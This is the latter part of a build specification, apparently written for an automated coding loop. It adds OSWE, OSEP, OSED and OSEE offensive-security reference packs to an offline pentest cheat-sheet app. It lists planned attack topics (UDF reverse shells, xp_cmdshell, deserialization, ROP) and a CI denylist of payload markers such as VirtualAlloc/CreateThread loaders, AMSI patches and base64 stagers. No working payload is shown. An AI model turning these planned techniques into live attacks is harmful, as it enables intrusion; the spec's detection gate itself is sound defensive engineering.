| `osee.kernel.re` | 64-bit kernel-driver RE & vuln discovery | IOCTL/attack-surface methodology; `[UNVERIFIED]` + cite; deep → Ringzero |
| `osee.kernel.mitigations` | kernel-mode mitigation bypass (kASLR/SMEP/SMAP/kCFG/HVCI) | concept map; cite ZDI/BlackHat talks; deep → Ringzero |

Every OSEE node: `os:['windows']`, `confidence:'unverified'`+cite (advanced/volatile area — flag liberally),
`references:[ref.osce3.joas, ref.osee.nccmitigations, ref.ringzero]`, `packs:[osee]`. These are reference
nodes: short summary + links, NO weaponization.

### 5.5 New variables (`src/data/variables.ts`, NON-frozen — extend)
Add the OSCE3 tokens (defang placeholders + examples; mark web/db creds sensitive):
`URL` (exists), `SOURCE_DIR`, `POST_DATA`, `SESSION` (sensitive), `COLLAB` (OOB host, defang),
`DBUSER`, `DBPASS` (sensitive), `OID`, `SO_PATH`, `REMOTE_FILE`, `CMD`, `LINKED` (MSSQL linked server),
`MODULE`, `MODULES`, `LENGTH`, `EIP`, `BADCHARS`, `PAYLOAD`. Reuse `LHOST`/`LPORT`/`RHOST`/`RPORT`/`USER`/
`PASS`/`DOMAIN`/`DC_IP` unchanged. `group` per `VarGroup` (`web`/`files`/`misc`/`auth`/`target`). Validation
where it applies; `sensitive:true` on `SESSION`/`DBPASS`.

---

## 6. REFERENCES registry — built from `_prompts/OSCE3-SOURCE-INDEX.md`

Extend `src/data/references.ts` (NON-frozen, deduped). Add the OSCE3 spine + per-pack primary sources. Every
`Reference` uses an existing `source` enum value (`other` for repos/blogs not covered by a specific value;
`official-tool-docs`/`microsoft`/`cve-nvd`/`exploitdb` where they fit). `archiveUrl` for link-rot.

```ts
// ---- OSCE3 spine ----
{ id: 'ref.osce3.joas', title: "Joas A. Santos — OSCE³ & OSEE Study Guide (taxonomy index)", url: 'https://github.com/JoasASantos/OSCE3-Complete-Guide', source: 'other' },
{ id: 'ref.ringzero', title: 'Ringzero — companion exploit-dev project (deep OSED/OSEE hands-on)', source: 'other' /* internal cross-link; no external host, no url */ },
// ---- OSWE primary (deep command sources) ----
{ id: 'ref.oswe.timip',      title: 'timip/OSWE',                         url: 'https://github.com/timip/OSWE', source: 'other' },
{ id: 'ref.oswe.0xb120',     title: '0xb120 — OSWE preparation notes',    url: 'https://github.com/0xb120/cheatsheets_and_ctf-notes', source: 'other' },
{ id: 'ref.oswe.hackingarticles', title: 'Hacking Articles — web vuln method guides (group cite)', url: 'https://www.hackingarticles.in/', source: 'other' },
{ id: 'ref.ysoserialnet',    title: 'ysoserial.net (.NET deserialization gadgets)', url: 'https://github.com/pwntester/ysoserial.net', source: 'other' },
{ id: 'ref.offsec.web300',   title: 'OffSec WEB-300 / OSWE Exam Guide',   url: 'https://help.offsec.com/', source: 'official-tool-docs' },
// ---- OSEP primary ----
{ id: 'ref.osep.chvancooten', title: 'chvancooten/OSEP-Code-Snippets',    url: 'https://github.com/chvancooten/OSEP-Code-Snippets', source: 'other' },
{ id: 'ref.osep.ross46',      title: 'Ross46/OSEP-PREP — Payloads.md',    url: 'https://github.com/Ross46/OSEP-PREP', source: 'other' },
{ id: 'ref.osep.awesomeredteam', title: 'CyberSecurityUP/Awesome-Red-Team-Operations', url: 'https://github.com/CyberSecurityUP/Awesome-Red-Team-Operations', source: 'other' },
{ id: 'ref.offsec.pen300',    title: 'OffSec PEN-300 / OSEP Exam FAQ',    url: 'https://help.offsec.com/', source: 'official-tool-docs' },
// ---- OSED primary ----
{ id: 'ref.osed.epi052',  title: 'epi052/osed-scripts',                   url: 'https://github.com/epi052/osed-scripts', source: 'other' },
{ id: 'ref.corelan',      title: 'Corelan — Exploit Writing Tutorials / mona.py', url: 'https://www.corelan.be/', source: 'other' },
{ id: 'ref.osed.sradley', title: 'sradley/osed',                          url: 'https://github.com/sradley/osed', source: 'other' },
{ id: 'ref.offsec.exp301', title: 'OffSec EXP-301 / OSED Exam Guide',     url: 'https://help.offsec.com/', source: 'official-tool-docs' },
// ---- OSEE primary ----
{ id: 'ref.osee.nccmitigations', title: 'NCC Group — windows_mitigations', url: 'https://github.com/nccgroup/exploit_mitigations', source: 'other' },
{ id: 'ref.offsec.exp401',   title: 'OffSec EXP-401 / OSEE',             url: 'https://www.offsec.com/courses/exp-401/', source: 'official-tool-docs' },
```
Rules: reviews/journey blogs are **secondary** references only (never a command source); group-cite them under
one id where possible. Tool repos (ysoserial.net, mona via Corelan, epi052 scripts, OSEP-Code-Snippets) are
ALSO surfaced through the v2 `ToolBinary` arsenal (F2, once built) with a `fetchNote` and NO `binaryUrl` —
link, never bundle. `ref.ringzero` is an internal cross-link only and carries **no `url`** (the frozen
`Reference.url` is optional) — `gate-routable-ip`/link gates must not require a URL for it.

---

## 7. MAKE THE EXISTING v2 SURFACES PACK-AWARE (filter, do NOT re-implement) — PREREQUISITE: v2 built

> **HARD PREREQUISITE.** Every surface below is specified in `CODE-PROMPT-v2-arsenal.md` and is built by the
> v2 loop, NOT here. As of today only `src/components/RealmSwitcher.tsx` exists; Ask (F4) / CVE (F6) /
> Advisor (F3) / Nmap (F8) / Decision (F5/F7) / ToolBinary (F2) are not yet in `src/`. A SURF-* box stays
> `☐` until its v2 surface exists AND the filter wiring below is in place. This section defines the filter
> CONTRACT each surface must satisfy once v2 lands — it does not assume any of them are live now.

The frozen surfaces already carry `packs`. When a surface exists, wire `usePacks.enabled` through it; never
fork it.

- **Search (CC-2 / F-search).** Pass `SearchFilters.packs = usePacks.getState().enabled` into every `search()`
  call (the `SearchPalette` already accepts `filters`). Add a pack-facet chip row in the palette (presentational,
  driven by the pack store). The combined index already tags every `SearchDoc.packs`; an OSCE3 doc is hidden
  when its pack is disabled. Ranking unchanged (verified>unverified tiebreak via the side table).
- **MindMaps (CC-3).** Each `MindMap.packs` filters which maps the realm offers; pack-disabled maps are not
  listed. Node→technique deep-links resolve only within enabled packs. One `Severity` scale still drives heat.
- **Ask-the-Octopus (F4, when built).** Add `oswe.*/osep.*/osed.*/osee.*` `IntentAlias` + `PhrasebookEntry`
  records that target the new technique ids; the resolve pipeline filters candidates by `usePacks.enabled`
  BEFORE ranking (deterministic, `id` final tiebreak). Every new alias/phrase target must resolve to a LIVE id.
- **Privilege Advisor (F3, when built).** OSEP Linux/Windows privesc + MSSQL nodes reuse F3 signals/rules via
  `relatedIds`; no new signal engine. Advisor results are filtered to enabled packs.
- **CVE / version lookup (F6, when built).** OSWE/OSED service-version/CVE entries are added as curated
  `CveExploitEntry` rows, cited (NVD+EDB) or `[UNVERIFIED]`; the lookup filters by enabled packs. No invented
  ids; reuse `cve-antifab`.
- **Decision maps (F5/F7, when built).** Add `dec.oswe.authbypass-to-rce`, `dec.osep.foothold-to-da` (chaining
  evasion→creds→lateral→AD, cross-linking OSCP `dec.ad.nocreds-to-da`), `dec.osed.crash-to-eip`. Each node
  reuses the existing `signalRef`/`commandId` FK pattern; decision-reachability gate covers them; filtered by pack.
- **Nmap Triage (F8, when built).** Add OSEP MSSQL (1433) → `osep.mssql.attacks` route and web→OSWE routes when
  the `oswe`/`osep` packs are enabled. Routing is pack-filtered; no new parser.

All of the above is **pass-the-filter wiring** in non-frozen modules + new dataset rows. Zero frozen edit, zero
capability re-implementation.

---

## 8. PACK SWITCHER (new presentational component; consumes design tokens)

`src/components/PackSwitcher.tsx` (NEW, props-in/events-out, pure-presentational):
- Renders the five packs as toggle chips (enable/disable) + a "focus" selector for the skin/badge. State lives
  in the EXISTING `usePacks` store (extended in §4.4); the component only emits `onToggle(id)` / `onFocus(id)`
  and reads `enabled` / `focused`.
- Each chip shows **icon + text label + color** (never hue-alone; CC-12). Color comes from a NEW `--cph-` KEY
  per pack — code declares the KEY, **design supplies the VALUE**. Add to `src/types/tokens.v3.ts` (NEW file;
  frozen `src/types/tokens.ts` untouched):
  ```ts
  export const TOKEN_KEYS_V3 = {
    pack: [
      '--cph-pack-oscp', '--cph-pack-oscp-contrast',
      '--cph-pack-oswe', '--cph-pack-oswe-contrast',
      '--cph-pack-osep', '--cph-pack-osep-contrast',
      '--cph-pack-osed', '--cph-pack-osed-contrast',
      '--cph-pack-osee', '--cph-pack-osee-contrast',
      '--cph-pack-badge-bg', '--cph-pack-badge-ring',
    ],
  } as const;
  ```
- The token-KEY parity gate is EXTENDED to assert every `TOKEN_KEYS_V3.pack` key resolves in `styles/theme.base.css`
  at `:root`/skins and no stray `--cph-pack-*` exists. (The existing `gateTokens` checks `Object.values(TOKEN_KEYS)`
  against `theme.base.css`; the extension scans `TOKEN_KEYS_V3` the same way — a non-frozen gate edit, no frozen
  `tokens.ts` change.) The realm skin (`data-os`) is unchanged; the pack badge is an accent layer on top,
  WCAG-AA in all three skins.
- A pack's `defaultOsSkin` (from its manifest) sets which `data-os` skin the realm wears when that pack is
  focused (oswe→linux, osep→ad, osed/osee→windows) — reusing the existing RealmSwitcher mechanism, no remount.

DESIGN note (for the companion DESIGN-PROMPT-v3): supply the 12 `--cph-pack-*` VALUES per skin + a small cert
badge glyph set. Code ships KEYS + CSS stubs only.

---

## 9. CI GATES — generalize the loader, add new gates, reuse the rest

### 9.0 LOAD-BEARING FIX — generalize the NON-frozen `loadBundle()` to span ALL packs
This is mandatory and comes FIRST; without it the "discipline enforced by real gates" claim is false for the
new packs. Today `scripts/gates.ts` `loadBundle()` (lines 21–22) is hardcoded to read ONLY
`public/content/oscp.json`, and EVERY reused gate (`gateFabrication`, `gateUnverifiedRefs`, `gateDenylist`,
`gateRoutableIp`, `gatePlaceholder`, `gateOverlap`, `gateSideTable`, `gateCredmode`, `gateCoverage`) calls it.
Since this brief emits OSCE3 content to per-pack `public/content/<id>.json`, those gates would NEVER scan
oswe/osep/osed/osee content. `scripts/gates.ts` is **NON-frozen** — generalizing it is fully legal.

Generalize `loadBundle()` to load + MERGE every registered pack bundle into ONE in-memory `ContentBundle`
the gates scan (no call-site changes — every reused gate keeps calling `loadBundle()` and now sees all packs):

```ts
// scripts/gates.ts — NON-FROZEN. Merge every registered pack bundle into one in-memory ContentBundle.
import { existsSync, readFileSync } from 'node:fs';
import { PACKS } from '@/data/packs';

export function loadBundle(): ContentBundle {
  const bundles = PACKS.map((p) => path.join(CONTENT, `${p.id}.json`))
    .filter((f) => existsSync(f))                       // unfilled packs may not be emitted yet
    .map((f) => JSON.parse(readFileSync(f, 'utf8')) as ContentBundle);
  const base = bundles.find((b) => true)!;              // oscp always present
  return {
    ...base,
    sections:   bundles.flatMap((b) => b.sections),
    techniques: bundles.flatMap((b) => b.techniques),
    commands:   bundles.flatMap((b) => b.commands),
    mindmaps:   bundles.flatMap((b) => b.mindmaps),
    bloodhound: bundles.flatMap((b) => b.bloodhound),
    // dedupe by id (refs/vars/tags are shared registries baked into every bundle):
    references: dedupeById(bundles.flatMap((b) => b.references)),
    variables:  dedupeById(bundles.flatMap((b) => b.variables)),
    tags:       dedupeById(bundles.flatMap((b) => b.tags)),
    packs:      PACKS,
  };
}
// (generatedAt is irrelevant to an in-memory gate scan; do not assert byte-stability on it — §0.6.)
```
With this single change, ALL reused discipline gates mechanically span the new packs: anti-fabrication,
no-machine-names, 8-gram overlap-dedup (catching OSCP↔OSEP duplication), unverified-refs, routable-ip,
placeholder, credmode, side-table, and coverage now scan oswe/osep/osed/osee content. State this explicitly
in the LOOP (§10, GATE-0) and execution order (§11). The new `gate-*.ts` wrappers (§9.1–9.3) use this same
merged `loadBundle()`.

### 9.1 CANON-MAP vs Gate 13 — decided route (no hard-fail on landing)
`gateCoverage` (Gate 13, `gates.ts:217-228`) walks `canon.mappings[]` and fails if a `node` id is absent from
the bundle's `techIds`. **Chosen resolution: the §9.0 merged `loadBundle()` is the mechanism.** Because Gate 13
now reads the MERGED bundle, its `techIds` set includes `oswe.*/osep.*/osed.*/osee.*`, so appending OSCE3 rows
to the legacy `canon-map.yaml` `mappings:` array resolves cleanly instead of hard-failing with "dangling node."
(Note Gate 13's coverage-manifest walk reads only the flat `cov.techniques` array; the new nested `osce3:` block
in §10.1 is consumed exclusively by `gate-pack-coverage`, so the two never collide.) This is the single picked
route — OSCE3 canon rows go in `mappings:` AND the merged loader makes them legal; we do not split them out.

### 9.2 NEW gates (thin `scripts/gate-*.ts` wrappers; register in `scripts/gates.ts` / `scripts/ci.ts`)
1. **`gate-pack-coverage` (G-OSCE3-2).** For every id in the `coverage.manifest.yaml` `osce3:` block: a Technique
   with that id exists in the MERGED bundle, its `packs[]` contains the right pack, and — for `oswe`/`osep`
   (`kind:'command-pack'`) — it resolves to ≥1 Command whose `template` COMPILES through the frozen
   `TemplateEngine` (all tokens known); for `osed`/`osee` (`kind:'reference-pack'`) — it resolves to ≥1 Command
   OR ≥1 `Reference` (link-out is acceptable coverage for a reference pack). Fails on dangling id or pack mismatch.
2. **`gate-osce3-cite` (G-OSCE3-1).** Every Technique/Command with a `oswe.*/osep.*/osed.*/osee.*` id carries
   `ref.osce3.joas` AND ≥1 primary `ref.*` from §6 in `references[]`; every `confidence:'unverified'` OSCE3
   node carries a non-empty `references[]` (transform-not-reproduce discipline, machine-checkable).
3. **`gate-evasion-methodology-only` (G-OSCE3-3).** For every Technique/Command tagged `evasion` (OSEP
   client-side/injection/AV/AppLocker/netfilter nodes): the `template`/`body` contains NO working-payload
   markers (denylist: encoded-shellcode blobs, `VirtualAlloc`+`CreateThread` loader bodies, AMSI-patch byte
   sequences, base64 stagers, `\x..`-string runs over a threshold) — evasion ships theory + detection/enum +
   provenance + decision-flow ONLY. Enumeration commands (`Get-AppLockerPolicy -Effective`) are allowed; a
   functioning bypass is a hard fail. Scoped strictly by the `evasion` tag (OSWE payloads are out of scope).

### 9.3 Reused gates — now spanning all packs via §9.0 (NOT "unchanged"; the loader is generalized)
`gate-fabrication` (anti-fab), `gate-unverified-refs`, `gate-denylist` (no-machine-names), `gate-routable-ip`,
`gate-placeholder`, `gate-credmode`, `gate-overlap` (8-gram dup — also CATCHES accidental OSCP/OSEP
duplication: OSEP AD nodes must cross-link, not clone), `gate-side-table`, `gate-coverage` (Gate 13), plus
`gate-tokens` (EXTENDED with `TOKEN_KEYS_V3.pack`), and tsc / lint / vitest / playwright (pack-filter e2e) /
build. No-bundled-binary discipline is enforced by reusing the F2 ToolBinary rule (no `binaryUrl`, no committed
blob) across the new tool refs. These gates require ZERO logic change other than the shared `loadBundle()`
generalization in §9.0 (and the `gate-tokens` scan extension); state precisely that the loader — not each gate —
is what makes them span OSCE3.

> The `gate-overlap` reuse is load-bearing: with the merged loader it is how "REUSE, don't duplicate OSCP AD in
> OSEP" is mechanically enforced — an OSEP node that copies an OSCP command's text trips the 8-gram fingerprint
> and must be replaced with a `relatedIds` cross-link.

---

## 10. `_prompts/LOOP.md` ADDITIONS — drive the packs to zero-gaps with the SAME loop

Append a v3 section to `_prompts/LOOP.md` (do not edit the v1/v2 blocks). Same `☐/☑` discipline: a leaf is `☑`
only when content-complete AND its gate is green. DEFINITION OF DONE extends: every v3 `☐` is `☑` AND all v3
gates exit 0 AND the FIVE frozen files (`src/types/{content,engine,components,tokens}.ts` +
`src/types/schema-parity.test.ts`) stay byte-identical (`git diff --stat` on those five paths = empty every
tick). The OSCP content JSON is checked "structurally unchanged ignoring `generatedAt`," NOT byte-identical (§0.6).

```
## v3 — OSCE3 CONTENT PACKS (OSWE / OSEP / OSED / OSEE)

Authority: _prompts/CODE-PROMPT-v3-osce3-packs.md (additive content; binds to FROZEN + v2; edits ZERO frozen files).
Prereq: v1 (OSCP content) + v2 (Ask/CVE/Advisor/Nmap/Decision/ToolBinary surfaces) complete — §7 wiring is gated
on v2. Source: _prompts/OSCE3-SOURCE-INDEX.md (Joas taxonomy + links; no commands). Discipline:
transform-not-reproduce + cite, no machine names, [UNVERIFIED]+cite, no bundled binaries, EVASION
methodology-only, OSED/OSEE deep hands-on → Ringzero, deterministic/offline/no-AI, NEVER edit a frozen module.

◆ PACK — REGISTRATION & PLUMBING (no frozen edit)
☐ PACK-0  generalize scripts/gates.ts loadBundle() → MERGE all registered pack bundles into one in-memory
          ContentBundle (NON-frozen script edit); every reused gate now spans all packs (§9.0)
☐ PACK-1  packs.ts registers oscp+oswe+osep+osed+osee; osed/osee via the (string & {}) PackId arm (no union edit)
☐ PACK-2  per-pack manifest src/data/pack-manifests/<id>.ts (label/blurb/skin/roots/kind/primaryRefs/badgeKey)
☐ PACK-3  build-content.ts generalized: content/<id>/** → public/content/<id>.json (oscp output STRUCTURALLY
          unchanged ignoring generatedAt — NOT byte-stable); ONE combined search index with SearchDoc.packs set;
          bloodhound/tag docs stay packs:['oscp']; mindmaps keyed by pack
☐ PACK-4  EXTEND src/stores/packs.ts (usePacks): keep array `enabled` + 'cephalo.packs' persist + oscp-lock;
          ADD `focused` + focus(id) + lazy same-origin loadPack(id). NO src/state/ store, NO Set rewrite
☐ PACK-5  PackSwitcher.tsx (presentational, consumes usePacks) + tokens.v3.ts --cph-pack-* KEYS; gate-tokens EXTENDED
          ☑ each: five frozen files byte-identical; pack toggles filter search+mindmaps(+v2 surfaces once built); gates green

◆ OSWE — WEB (deep copy-paste command pack; 22 techniques; os:['linux']/['windows'])
☐ OSWE-1  method.tooling + method.sourcereview (sink→source grep methodology)
☐ OSWE-2  xss.stored + xss.dom + session.hijack
☐ OSWE-3  sqli.blind + bypass.regex + bypass.charset + exfil.data
☐ OSWE-4  deser.dotnet (ysoserial.net) + rce.chain + rce.dbfunc
☐ OSWE-5  upload.bypass + php.typejuggle + php.magichash
☐ OSWE-6  pgsql.udf + pgsql.udfrevshell + pgsql.largeobject
☐ OSWE-7  ssti + xxe + token.weakrandom + cmdinj.websocket
          ☑ each leaf: {{TOKENS}} + correct shell (sql/text/bash) + danger + confidence + refs(joas+primary);
          indexed in MiniSearch with packs:[oswe]; ≥1 mindmap node; CVE/version claims [UNVERIFIED]+cite

◆ OSEP — EVASION + LATERAL (deep pack; 16 techniques; EVASION = methodology-only; AD REUSES OSCP)
☐ OSEP-1  theory.os + method.combine (full-chain mindmap)
☐ OSEP-2  clientside.office + clientside.jscript  (METHODOLOGY ONLY — evasion-methodology-only gate)
☐ OSEP-3  inject.process + evasion.intro + evasion.advanced  (METHODOLOGY ONLY)
☐ OSEP-4  evasion.applocker + evasion.netfilter  (enumeration commands ok; no bypass payload)
☐ OSEP-5  win.creds + win.lateral  (REUSE ad.lateral.*/win.loot.* via relatedIds — overlap gate must not trip)
☐ OSEP-6  linux.post + linux.lateral + kiosk.breakout  (reuse linux.* via relatedIds)
☐ OSEP-7  mssql.attacks (xp_cmdshell/linked-server/EXECUTE AS — real copy-paste, danger:critical)
☐ OSEP-8  ad.exploit BRIDGE (relatedIds → full oscp ad.* tree; zero duplication)
          ☑ each leaf: evasion nodes tagged `evasion` carry NO payload; lateral/AD nodes cross-link not clone;
          packs:[osep]; refs(joas+primary); indexed; ≥1 decision/mindmap node

◆ OSED — EXPLOIT-DEV REFERENCE (reference pack; 10 techniques; os:['windows']; deep → Ringzero)
☐ OSED-1  windbg + stack.bof (pattern_create/offset, !mona pattern)
☐ OSED-2  seh + egghunter (!mona seh / !mona egg; msfvenom egg payload)
☐ OSED-3  ida + re.bugs (crash triage; methodology body)
☐ OSED-4  shellcode (nasm_shell/nasm) + formatstring
☐ OSED-5  bypass.depaslr + rop (!mona rop/ropfunc/jmp) — deep build → ref.ringzero
          ☑ each leaf: copy-paste helper commands only (msfvenom/mona/nasm/WinDbg); NEVER an invented offset/
          gadget (confidence:'unverified'+cite); packs:[osed]; body links Ringzero; indexed

◆ OSEE — ADVANCED WINDOWS REFERENCE (reference pack; 5 techniques; mostly concept+links → Ringzero)
☐ OSEE-1  usermode.mitigations (DEP/ASLR/CFG/ACG/CET concept map; NCC cite)
☐ OSEE-2  heap.escape + wdeg.disarm (concept; review disclosure status before linking; [UNVERIFIED])
☐ OSEE-3  kernel.re + kernel.mitigations (IOCTL surface; kASLR/SMEP/SMAP/kCFG/HVCI concept) — deep → Ringzero
          ☑ each leaf: concept summary + cited links ONLY; no weaponization; confidence:'unverified'+cite;
          packs:[osee]; body links Ringzero; indexed

◆ SURFACES — PACK-AWARENESS (filter existing v2; do not re-implement; PREREQ: v2 surface exists)
☐ SURF-1  search + SearchPalette pack-facet chips honor usePacks.enabled (SearchFilters.packs)
☐ SURF-2  mindmaps + (once v2-built) Ask(F4)/Advisor(F3)/CVE(F6)/Decision(F5/F7)/Nmap(F8) filter by usePacks.enabled
☐ SURF-3  dec.oswe.authbypass-to-rce, dec.osep.foothold-to-da (cross-links dec.ad.nocreds-to-da), dec.osed.crash-to-eip
          ☑ every new alias/phrase/route/decision target resolves to a LIVE pack-tagged id; reachability gate green
          (a SURF box stays ☐ until its v2 surface exists AND the filter wiring is in place)

◆ GATE — NEW CI (CC-11 extension)
☐ GATE-0  loadBundle() merges all registered pack bundles (PACK-0); reused gates verified to scan OSCE3 content
☐ GATE-1  gate-pack-coverage (every coverage osce3 id → technique+pack+compiling-command|reference)
☐ GATE-2  gate-osce3-cite (joas + ≥1 primary on every OSCE3 node; unverified carries refs)
☐ GATE-3  gate-evasion-methodology-only (no working bypass payload on any `evasion`-tagged node)
☐ GATE-4  reuse (now spanning all packs via merged loader): fabrication, unverified-refs, denylist(no-machine-names),
          routable-ip, placeholder, overlap (catches OSCP↔OSEP duplication), side-table, credmode, coverage(Gate 13
          resolves OSCE3 canon rows via merged techIds), EXTENDED token-parity, no-bundled-binary
          ☑ all v3 gates exit 0; five frozen files byte-identical (git diff --stat empty)
```

### 10.1 `coverage.manifest.yaml` — additive `osce3:` block (abstract technique IDs; NO machine names)
Append a NEW nested `osce3:` block (consumed ONLY by `gate-pack-coverage`; the legacy `gateCoverage` walks the
flat `techniques:` array and never touches this). The loop counts these toward 100%; `gate-pack-coverage` fails
on any unmapped id. Bands: deep packs core/high; reference packs medium/low (still required for pack coverage).

```yaml
osce3:
  oswe:
    - { id: oswe.method.tooling, band: high }
    - { id: oswe.method.sourcereview, band: core }
    - { id: oswe.xss.stored, band: high }
    - { id: oswe.xss.dom, band: medium }
    - { id: oswe.session.hijack, band: high }
    - { id: oswe.sqli.blind, band: core }
    - { id: oswe.exfil.data, band: high }
    - { id: oswe.deser.dotnet, band: core }
    - { id: oswe.rce.chain, band: core }
    - { id: oswe.rce.dbfunc, band: high }
    - { id: oswe.upload.bypass, band: high }
    - { id: oswe.php.typejuggle, band: medium }
    - { id: oswe.php.magichash, band: medium }
    - { id: oswe.pgsql.udf, band: high }
    - { id: oswe.pgsql.udfrevshell, band: high }
    - { id: oswe.pgsql.largeobject, band: medium }
    - { id: oswe.bypass.regex, band: medium }
    - { id: oswe.bypass.charset, band: medium }
    - { id: oswe.ssti, band: high }
    - { id: oswe.xxe, band: high }
    - { id: oswe.token.weakrandom, band: medium }
    - { id: oswe.cmdinj.websocket, band: medium }
  osep:
    - { id: osep.theory.os, band: medium }
    - { id: osep.clientside.office, band: high }
    - { id: osep.clientside.jscript, band: high }
    - { id: osep.inject.process, band: high }
    - { id: osep.evasion.intro, band: high }
    - { id: osep.evasion.advanced, band: high }
    - { id: osep.evasion.applocker, band: high }
    - { id: osep.evasion.netfilter, band: medium }
    - { id: osep.linux.post, band: medium }
    - { id: osep.kiosk.breakout, band: low }
    - { id: osep.win.creds, band: high }
    - { id: osep.win.lateral, band: core }
    - { id: osep.linux.lateral, band: medium }
    - { id: osep.mssql.attacks, band: core }
    - { id: osep.ad.exploit, band: core }
    - { id: osep.method.combine, band: high }
  osed:
    - { id: osed.windbg, band: high }
    - { id: osed.stack.bof, band: core }
    - { id: osed.seh, band: high }
    - { id: osed.ida, band: medium }
    - { id: osed.egghunter, band: medium }
    - { id: osed.shellcode, band: medium }
    - { id: osed.re.bugs, band: medium }
    - { id: osed.bypass.depaslr, band: high }
    - { id: osed.formatstring, band: low }
    - { id: osed.rop, band: high }
  osee:
    - { id: osee.usermode.mitigations, band: medium }
    - { id: osee.heap.escape, band: low }
    - { id: osee.wdeg.disarm, band: low }
    - { id: osee.kernel.re, band: low }
    - { id: osee.kernel.mitigations, band: low }
decisions-v3: [dec.oswe.authbypass-to-rce, dec.osep.foothold-to-da, dec.osed.crash-to-eip]
nmap-routes-v3:
  - { id: nmap.route.mssql-osep, port: 1433, band: high }   # → osep.mssql.attacks when osep enabled
  - { id: nmap.route.web-oswe,   port: 80,   band: high }   # → oswe.* when oswe enabled
```

### 10.2 `canon-map.yaml` — additive OSCE3 mappings (route DECIDED: legacy `mappings:` + merged loader)
Append `{ source: 'OSCE3: <taxonomy heading>', node: <id> }` rows to the existing `mappings:` array so every
taxonomy item from `OSCE3-SOURCE-INDEX.md` maps to ≥1 authored node (superset audit). This is SAFE — and does
NOT hard-fail Gate 13 on landing — ONLY because §9.0 generalizes `loadBundle()` so Gate 13's `techIds` set spans
all packs (§9.1). The rows must land in the SAME tick as (or after) the techniques they reference, and after
PACK-0/PACK-3, so the merged bundle already contains those `oswe.*/osep.*/osed.*/osee.*` ids. Syllabus framing
is a CITATION source only — no machine names, no course prose.

---

## 11. EXECUTION ORDER (how the loop folds this in)

1. **Loader + plumbing first (PACK-0…5).** Generalize `loadBundle()` to merge all registered pack bundles
   (PACK-0, §9.0) — do this BEFORE anything else so the reused gates span OSCE3 the moment content lands.
   Register packs, manifests, generalize the build (emit per-pack `<id>.json`, combined index, oscp/bloodhound/
   tag docs preserved), EXTEND `usePacks` (focused + lazy loader; keep array `enabled`/persist/oscp-lock),
   build `PackSwitcher` + `tokens.v3.ts` KEYS, extend token-parity gate. **Verify the FIVE frozen files
   `git diff --stat` empty**, and verify the OSCP bundle is **structurally unchanged ignoring `generatedAt`**
   (normalize-then-diff; it is NOT byte-identical — §0.6).
2. **References + variables:** land §5.5 vars + §6 refs so content can cite/compile.
3. **New gates (GATE-0…4):** confirm the merged loader (GATE-0), add `gate-pack-coverage` / `gate-osce3-cite` /
   `gate-evasion-methodology-only`, register in `ci.ts`. They start RED (no content) — that is the gap that
   drives authoring.
4. **Author packs to zero-gaps:** OSWE → OSEP → OSED → OSEE, highest band first, each leaf cited + token-correct
   + indexed + on a mindmap/decision, evasion methodology-only, OSED/OSEE bodies linking Ringzero. Append the
   matching `canon-map.yaml` rows (§10.2) in lockstep with the techniques they reference.
5. **Surface awareness (SURF-1…3) — gated on v2:** once a v2 surface exists, thread `usePacks.enabled` through
   search/mindmaps/Ask/Advisor/CVE/Decision/Nmap; add the new decision maps + routes. A SURF box that depends
   on an unbuilt v2 surface stays `☐` until v2 lands.
6. **Coverage to 100% + all gates green;** every tick re-verify the five frozen files are byte-identical and the
   OSCP bundle is structurally unchanged ignoring `generatedAt`. Only when all v1+v2+v3 `☐` are `☑` and all
   gates exit 0 does the loop print COMPLETE.

---

## 12. DEFINITION OF DONE (v3 extension — ALL must hold, with v1+v2)

1. Every v3 `☐` in §10 is `☑`; `oswe`/`osep`/`osed`/`osee` each have zero open boxes (SURF boxes that depend on
   an unbuilt v2 surface are only required once that surface exists per the v2 loop).
2. `coverage.manifest.yaml` `osce3:` ids are 100% covered; `canon-map.yaml` maps every OSCE3 taxonomy heading to
   ≥1 node and Gate 13 resolves them (merged loader); `gate-pack-coverage` exits 0.
3. `loadBundle()` merges all registered pack bundles, so `gate-osce3-cite`, `gate-evasion-methodology-only`, and
   all reused gates (anti-fab, unverified-refs, no-machine-names, routable-ip, placeholder, overlap, side-table,
   credmode, EXTENDED token-parity, coverage, no-bundled-binary) exit 0 SCANNING OSCE3 content;
   tsc/lint/vitest/playwright/build green.
4. The FIVE frozen files `src/types/{content,engine,components,tokens}.ts` + `src/types/schema-parity.test.ts`
   are BYTE-IDENTICAL to pre-v3 (`git diff --stat` on those five paths = empty). `osed`/`osee` live entirely on
   the `(string & {})` `PackId` arm (no union edit; `PackIdSchema = z.string().min(1)` unchanged). The OSCP
   content JSON is verified **structurally unchanged ignoring `generatedAt`** — it is NOT byte-stable and is
   never asserted to be (§0.6).
5. Activation runs through the EXTENDED existing `src/stores/packs.ts` (`usePacks`: array `enabled`,
   'cephalo.packs' persistence, oscp-lock, + new `focused`/lazy loader) — no `src/state/` store exists.
6. Every OSCE3 Command/Technique carries `references[]` (incl. `ref.osce3.joas` + a primary) OR an explicit
   `[UNVERIFIED]` badge; no working evasion payload, no bundled binary, no machine name, no fabricated fact
   anywhere; the app builds, installs as a PWA, and works fully offline with the new packs toggled on/off.

Only when v1 + v2 + v3 all hold: print `CEPHALO COMPLETE — all checklists ☑ (OSCP + arsenal + OSCE3 packs),
all gates green` and end the loop.